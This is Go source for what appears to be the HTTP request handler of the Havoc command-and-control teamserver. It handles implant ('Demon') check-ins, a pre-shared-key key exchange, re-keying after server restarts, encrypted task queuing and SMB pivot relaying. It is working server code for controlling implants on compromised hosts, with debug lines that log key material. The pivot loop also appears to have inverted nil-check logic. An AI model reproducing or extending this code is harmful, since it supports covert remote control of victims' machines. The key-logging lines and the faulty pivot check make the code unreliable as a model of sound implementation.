package handlers

import (
	"bytes"
	//"encoding/hex"
	"fmt"
	"math/bits"

	"Havoc/pkg/agent"
	"Havoc/pkg/common/packer"
	"Havoc/pkg/common/parser"
	"Havoc/pkg/logger"
)

func parseAgentRequest(Teamserver agent.TeamServer, Body []byte, ExternalIP string, PSK []byte) (bytes.Buffer, bool) {

	var (
		Header   agent.Header
		Response bytes.Buffer
		err      error
	)

	Header, err = agent.ParseHeader(Body)
	if err != nil {
		logger.Debug("[Error] Header: " + err.Error())
		return Response, false
	}

	if Header.Data.Length() < 4 {
		return Response, false
	}

	// handle this demon connection if the magic value matches any in our pool
	if agent.IsValidDemonMagic(uint32(Header.MagicValue)) {
		return handleDemonAgent(Teamserver, Header, Body, ExternalIP, PSK)
	}

	// If it's not a Demon request then try to see if it's a 3rd party agent.
	return handleServiceAgent(Teamserver, Header, ExternalIP)
}

// handleDemonAgent
// parse the demon agent request
// return 2 types:
//
//	Response bytes.Buffer
//	Success  bool
func handleDemonAgent(Teamserver agent.TeamServer, Header agent.Header, Body []byte, ExternalIP string, PSK []byte) (bytes.Buffer, bool) {

	var (
		Agent     *agent.Agent
		Response  bytes.Buffer
		RequestID uint32
		Command   uint32
		Packer    *packer.Packer
		Build     []byte
		err       error
	)

	// Agent not in memory — check DB before assuming new agent.
	// After a server restart, agents are still in the DB with valid session keys.
	// Load from DB so the agent can continue operating without re-KEX.
	if !Teamserver.AgentExist(Header.AgentID) {

		// Try to restore from database first
		Agent = Teamserver.AgentLoadFromDB(Header.AgentID)
		if Agent != nil {
			logger.Debug(fmt.Sprintf("Agent %x restored from DB — processing as existing agent", Header.AgentID))
			// Fall through to existing-agent handling below
		} else {
			// Not in DB either — truly new agent, needs KEX
			kexLen := agent.KexPubLen + agent.KexNonceLen + agent.KexMacLen
			if Header.Data.Length() >= kexLen {
				var hello agent.AgentHello
				buf := Header.Data.ParseAtLeastBytes(kexLen)
				if len(buf) >= kexLen {
					copy(hello.Ea[:], buf[0:agent.KexPubLen])
					copy(hello.NonceA[:], buf[agent.KexPubLen:agent.KexPubLen+agent.KexNonceLen])
					copy(hello.MacA[:], buf[agent.KexPubLen+agent.KexNonceLen:agent.KexPubLen+agent.KexNonceLen+agent.KexMacLen])

					logger.Debug(fmt.Sprintf("[KEX] Handler PSK len=%d", len(PSK)))
					if len(PSK) >= 8 {
						logger.Debug(fmt.Sprintf("[KEX] Handler PSK first8=%x", PSK[:8]))
					}

					sh, dk, errK := agent.ServerProcessAgentHello(PSK, hello)
					if errK != nil {
						logger.Debug(fmt.Sprintf("KEX failed: %v", errK))
						return Response, false
					}

					// Create agent placeholder
					Agent = &agent.Agent{
						Active: false,
						Info:   new(agent.AgentInfo),
						Encryption: struct {
							AESKey []byte
							AESIv  []byte
							AESMac []byte
							PSK    []byte
						}{
							AESKey: append([]byte{}, dk.AESKey[:]...),
							AESIv:  append([]byte{}, dk.AESIv[:]...),
							AESMac: append([]byte{}, dk.AESMac[:]...),
							PSK:    append([]byte{}, PSK...),
						},
						MagicValue: uint32(Header.MagicValue),
					}
					Agent.NameID = fmt.Sprintf("%08x", Header.AgentID)

					// Send ServerHello
					respBytes := make([]byte, 0, agent.KexPubLen+agent.KexNonceLen+agent.KexMacLen)
					respBytes = append(respBytes, sh.Es[:]...)
					respBytes = append(respBytes, sh.NonceS[:]...)
					respBytes = append(respBytes, sh.MacS[:]...)
					Response.Write(respBytes)

					// Stash pending agent in Teamserver (inactive until metadata arrives)
					Teamserver.AgentAdd(Agent)
					return Response, true
				}
			}
			// No valid KEX payload for new agent
			return Response, false
		}
	}

	/* check if the agent exists. */
		/* get our agent instance based on the agent id */
		Agent = Teamserver.AgentInstance(Header.AgentID)
		if Agent == nil {
			logger.Debug(fmt.Sprintf("Agent %x exists in DB but not in memory — stale entry", Header.AgentID))
			return Response, false
		}
		Agent.UpdateLastCallback(Teamserver)

	// If the agent is not active yet, this packet should be the encrypted metadata following KEX.
	if Agent.Active == false {
		// Debug: print the MacKey being used
		if len(Agent.Encryption.AESMac) >= 8 {
			logger.Debug(fmt.Sprintf("[MAC] Server MacKey first8=%x", Agent.Encryption.AESMac[:8]))
		}
		logger.Debug(fmt.Sprintf("[MAC] Data len=%d, verifying MAC over %d bytes", Header.Data.Length(), Header.Data.Length()-32))

		// MAC verify then decrypt metadata payload with session keys
		if !Header.Data.TrimMACAndVerify(Agent.Encryption.AESMac) {
			logger.Debug(fmt.Sprintf("MAC verify failed for Agent %x (metadata)", Header.AgentID))
			return Response, false
		}

		// Decrypt FIRST — CommandID and RequestID are now encrypted (padding=12)
		// Format: [encrypted(commandID + requestID + metadata...)]
		Header.Data.DecryptBuffer(Agent.Encryption.AESKey, Agent.Encryption.AESIv)

		// Now parse CommandID and RequestID from decrypted data
		if Header.Data.Length() >= 8 {
			_ = Header.Data.ParseInt32() // CommandID (DEMON_INITIALIZE = 99)
			_ = Header.Data.ParseInt32() // RequestID
		}

		// Parse registration info (no leading AES key/IV anymore)
		RegAgent := agent.ParseDemonRegisterRequest(Header.AgentID, Header.Data, ExternalIP)
		if RegAgent == nil {
			return Response, false
		}

		// Copy registration info into existing agent
		Agent.Active = true
		Agent.Info = RegAgent.Info
		// Use magic value from packet header, not metadata (agent doesn't send it in metadata anymore)
		Agent.MagicValue = uint32(Header.MagicValue)
		Agent.NameID = RegAgent.NameID
		Agent.DynamicCommands = RegAgent.DynamicCommands
		Agent.TaskedOnce = false

		// Now that agent is active with full info, add to DB
		// (AgentAdd skips inactive agents, so we add now that it's active)
		Teamserver.AgentAdd(Agent)
		Teamserver.AgentUpdate(Agent)

		// CRITICAL: Notify UI about the new active agent
		// AgentAdd during KEX didn't notify because agent was inactive
		Teamserver.AgentSendNotify(Agent)

		return Response, true
	}

		// For active agents: verify MAC FIRST over entire Header.Data
		// Packet format: [encrypted(commandID+requestID+payload)][MAC]
		// - Everything after Size+Magic+AgentID is encrypted (padding=12)
		
		// IMPORTANT: After server restart, agent may send fresh KEX hello instead of regular packet
		// This happens because agent reconnects and starts from scratch while server loaded old session from DB
		// We need to detect this and allow re-KEX
		kexLen := agent.KexPubLen + agent.KexNonceLen + agent.KexMacLen // 32+16+32 = 80
		originalDataLen := Header.Data.Length()
		
		if !Header.Data.TrimMACAndVerify(Agent.Encryption.AESMac) {
			logger.Debug(fmt.Sprintf("MAC verify failed for Agent %x (dataLen=%d)", Header.AgentID, originalDataLen))
			
			// Check if this might be a KEX hello (agent reconnecting after server restart)
			// KEX hello is exactly 80 bytes: [32 Ea][16 NonceA][32 MacA]
			if originalDataLen >= kexLen {
				logger.Debug(fmt.Sprintf("Agent %x: MAC failed, checking if packet is KEX hello (size=%d)", Header.AgentID, originalDataLen))
				
				// Reset the parser to read from the beginning
				Header.Data = parser.NewParser(Body[12:]) // Skip Size(4)+Magic(4)+AgentID(4)
				
				var hello agent.AgentHello
				buf := Header.Data.ParseAtLeastBytes(kexLen)
				if len(buf) >= kexLen {
					copy(hello.Ea[:], buf[0:agent.KexPubLen])
					copy(hello.NonceA[:], buf[agent.KexPubLen:agent.KexPubLen+agent.KexNonceLen])
					copy(hello.MacA[:], buf[agent.KexPubLen+agent.KexNonceLen:agent.KexPubLen+agent.KexNonceLen+agent.KexMacLen])
					
					sh, dk, errK := agent.ServerProcessAgentHello(PSK, hello)
					if errK != nil {
						logger.Debug(fmt.Sprintf("Re-KEX failed for agent %x: %v", Header.AgentID, errK))
						return Response, false
					}
					
					// Update agent's session keys (keep agent active, just refresh keys)
					Agent.Encryption.AESKey = append([]byte{}, dk.AESKey[:]...)
					Agent.Encryption.AESIv = append([]byte{}, dk.AESIv[:]...)
					Agent.Encryption.AESMac = append([]byte{}, dk.AESMac[:]...)
					Agent.Active = false // Mark as inactive until re-registration
					
					logger.Debug(fmt.Sprintf("Agent %x: Re-KEX successful, new AESMac first8=%x", Header.AgentID, Agent.Encryption.AESMac[:8]))
					
					// Update DB with new keys
					Teamserver.AgentUpdate(Agent)
					
					// Send ServerHello response
					respBytes := make([]byte, 0, agent.KexPubLen+agent.KexNonceLen+agent.KexMacLen)
					respBytes = append(respBytes, sh.Es[:]...)
					respBytes = append(respBytes, sh.NonceS[:]...)
					respBytes = append(respBytes, sh.MacS[:]...)
					Response.Write(respBytes)
					
					return Response, true
				}
			}
			
			return Response, false
		}

		// After MAC strip, Header.Data = [encrypted(outerCommandID + outerRequestID + inner_packages)]
		// Decrypt FIRST, then parse outer command and inner packages
		asked_for_jobs := false

		// Decrypt the entire payload (CommandID+RequestID+inner data are all encrypted)
		if Header.Data.Length() > 0 {
			Header.Data.DecryptBuffer(Agent.Encryption.AESKey, Agent.Encryption.AESIv)
		}

		// Now parse OUTER command from decrypted data
		if !Header.Data.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
			logger.Debug(fmt.Sprintf("Agent %x: packet too short for command header after decrypt", Header.AgentID))
			return Response, false
		}

		OuterCommand := uint32(Header.Data.ParseInt32())
		_ = uint32(Header.Data.ParseInt32()) // outer RequestID (usually 0)

		// Handle special case: DEMON_INIT (reconnect request)
		if OuterCommand == agent.DEMON_INIT {
				logger.Debug(fmt.Sprintf("Agent: %x, Command: DEMON_INIT", Header.AgentID))
				Packer = packer.NewPacker(Agent.Encryption.AESKey, Agent.Encryption.AESIv)
				Packer.AddUInt32(uint32(Header.AgentID))

				Build = Packer.Build()

				_, err = Response.Write(Build)
				if err != nil {
					logger.Error(err)
					return Response, false
				}
				logger.Debug(fmt.Sprintf("reconnected %x", Build))
				return Response, true
			}

		// Agent always wraps responses in COMMAND_GET_JOB
		// Inner encrypted payload contains: [CommandID][RequestID][Data][CommandID][RequestID][Data]...
		if OuterCommand == agent.COMMAND_GET_JOB {
			asked_for_jobs = true

			// Parse inner packages: [CommandID][RequestID][Data]...
			for Header.Data.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
				Command = uint32(Header.Data.ParseInt32())
				RequestID = uint32(Header.Data.ParseInt32())

				logger.Debug(fmt.Sprintf("Agent: %x, Inner Command: %d, RequestID: %x", Header.AgentID, Command, RequestID))

				// Parse the inner data for this command
				Parser := parser.NewParser(Header.Data.ParseBytes())
				Agent.TaskDispatch(RequestID, Command, Parser, Teamserver)
			}
		} else {
			// Unexpected outer command (not GET_JOB or DEMON_INIT)
			logger.Debug(fmt.Sprintf("Agent: %x, Unexpected outer command: %d", Header.AgentID, OuterCommand))
		}

		/* if there is no job then just reply with a COMMAND_NOJOB */
		if asked_for_jobs == false || len(Agent.JobQueue) == 0 {
			var NoJob = []agent.Job{{
				Command: agent.COMMAND_NOJOB,
				Data:    []interface{}{},
			}}

			var Payload = agent.BuildPayloadMessage(NoJob, Agent.Encryption.AESKey, Agent.Encryption.AESIv)

			_, err = Response.Write(Payload)
			if err != nil {
				logger.Error("Couldn't write to HTTP connection: " + err.Error())
				return Response, false
			}

		} else {
			/* if there is a job then send the Task Queue */
			var (
				job     = Agent.GetQueuedJobs()
				payload = agent.BuildPayloadMessage(job, Agent.Encryption.AESKey, Agent.Encryption.AESIv)
			)

			// write the response to the buffer
			_, err = Response.Write(payload)
			if err != nil {
				logger.Error("Couldn't write to HTTP connection: " + err.Error())
				return Response, false
			}

			// TODO: move this to its own function
			// show bytes for pivot
			var CallbackSizes = make(map[uint32][]byte)
			for j := range job {

				if len(job[j].Data) >= 1 {

					switch job[j].Command {

					case agent.COMMAND_PIVOT:

						if job[j].Data[0] == agent.DEMON_PIVOT_SMB_COMMAND {

							var (
								TaskBuffer    = job[j].Data[2].([]byte)
								PivotAgentID  = job[j].Data[1].(int) // Changed from uint32 to int
								PivotInstance *agent.Agent
							)

							for {
								var (
									Parser       = parser.NewParser(TaskBuffer)
									CommandID    = 0
									SubCommandID = 0
								)

								Parser.SetBigEndian(false)

								Parser.ParseInt32()
								Parser.ParseInt32()

								CommandID = Parser.ParseInt32()

								// Socks5 over SMB agents yield a CommandID equal to 0
								if CommandID != agent.COMMAND_PIVOT && CommandID != 0 {
									//CallbackSizes[uint32(PivotAgentID)] = append(CallbackSizes[job[j].Data[1].(uint32)], TaskBuffer...)
									break
								}

								/* get an instance of the pivot */
								PivotInstance = Teamserver.AgentInstance(PivotAgentID)
								if PivotInstance != nil {
									break
								}

								/* parse the task from the parser */
								TaskBuffer = Parser.ParseBytes()

								/* create a new parse for the parsed task */
								Parser = parser.NewParser(TaskBuffer)
								Parser.DecryptBuffer(PivotInstance.Encryption.AESKey, PivotInstance.Encryption.AESIv)

								if Parser.Length() >= 4 {

									SubCommandID = Parser.ParseInt32()
									SubCommandID = int(bits.ReverseBytes32(uint32(SubCommandID)))

									if SubCommandID == agent.DEMON_PIVOT_SMB_COMMAND {
										PivotAgentID = Parser.ParseInt32()
										PivotAgentID = int(bits.ReverseBytes32(uint32(PivotAgentID)))

										TaskBuffer = Parser.ParseBytes()
										continue

									} else {
										CallbackSizes[uint32(PivotAgentID)] = append(CallbackSizes[uint32(PivotAgentID)], TaskBuffer...)

										break
									}

								}

							}

						}

						break

					case agent.COMMAND_SOCKET:

						break

					case agent.COMMAND_FS:

						break

					case agent.COMMAND_MEM_FILE:

						break

					default:
						//logger.Debug("Default")
						/* build the task payload */
						payload = agent.BuildPayloadMessage([]agent.Job{job[j]}, Agent.Encryption.AESKey, Agent.Encryption.AESIv)

						/* add the size of the task to the callback size */
						CallbackSizes[uint32(Header.AgentID)] = append(CallbackSizes[uint32(Header.AgentID)], payload...)

						break

					}

				} else {
					CallbackSizes[uint32(Header.AgentID)] = append(CallbackSizes[uint32(Header.AgentID)], payload...)
				}

			}

			for agentID, buffer := range CallbackSizes {
				Agent = Teamserver.AgentInstance(int(agentID))
				if Agent != nil {
					Teamserver.AgentCallbackSize(Agent, len(buffer))
				}
			}

			CallbackSizes = nil
	}

	return Response, true
}

// handleServiceAgent
// handles and parses a service agent request
// return 2 types:
//
//	Response bytes.Buffer
//	Success  bool
func handleServiceAgent(Teamserver agent.TeamServer, Header agent.Header, ExternalIP string) (bytes.Buffer, bool) {

	var (
		Response  bytes.Buffer
		AgentData any
		Agent     *agent.Agent
		Task      []byte
		err       error
	)

	/* search if a service 3rd party agent was registered with this MagicValue */
	if !Teamserver.ServiceAgentExist(Header.MagicValue) {
		return Response, false
	}

	Agent = Teamserver.AgentInstance(Header.AgentID)
	if Agent != nil {
		AgentData = Agent.ToMap()
	}
	
	// Update Callback time
	if Teamserver.AgentExist(Header.AgentID) {
		Agent.UpdateLastCallback(Teamserver)
	}
	
	Task = Teamserver.ServiceAgent(Header.MagicValue).SendResponse(AgentData, Header)
	//logger.Debug("Response:\n", hex.Dump(Task))

	_, err = Response.Write(Task)
	if err != nil {
		return Response, false
	}

	return Response, true
}

// notifyTaskSize
// notifies every connected operator client how much we send to agent.
func notifyTaskSize(teamserver agent.TeamServer) {

}
